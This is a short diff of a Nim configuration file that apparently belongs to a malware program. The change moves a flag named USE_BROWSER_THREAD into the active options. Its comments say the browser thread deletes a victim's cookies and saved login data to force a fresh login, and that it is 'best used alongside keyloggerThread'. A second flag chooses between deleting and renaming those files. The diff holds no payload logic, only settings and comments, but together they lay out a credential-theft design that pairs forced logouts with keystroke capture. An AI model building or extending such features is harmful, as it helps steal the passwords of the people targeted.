@@ -1,6 +1,11 @@
 ## this file contains flags and other options
 ## used by the program
 
+## browserThread is used for deleting cookies and login data
+## so the user is forced to login back again
+## best used alongside keyloggerThread
+## DEFAULT: true
+const USE_BROWSER_THREAD*: bool = true
 
 ## when `true` the browser thread will remove cookies
 ## and other files instead of renaming them
@@ -10,11 +15,6 @@ const BROWSER_THREAD_REMOVE_FILE*: bool = false
 
 ## TODO: IMPLEMENT THE FOLLOWING LINES
 
-## browserThread is used for deleting cookies and login data
-## so the user is forced to login back again
-## best used alongside keyloggerThread
-## DEFAULT: true
-const USE_BROWSER_THREAD*: bool = true
 
 type browserThreadStart = enum
   Always ## NOT RECOMMENDED
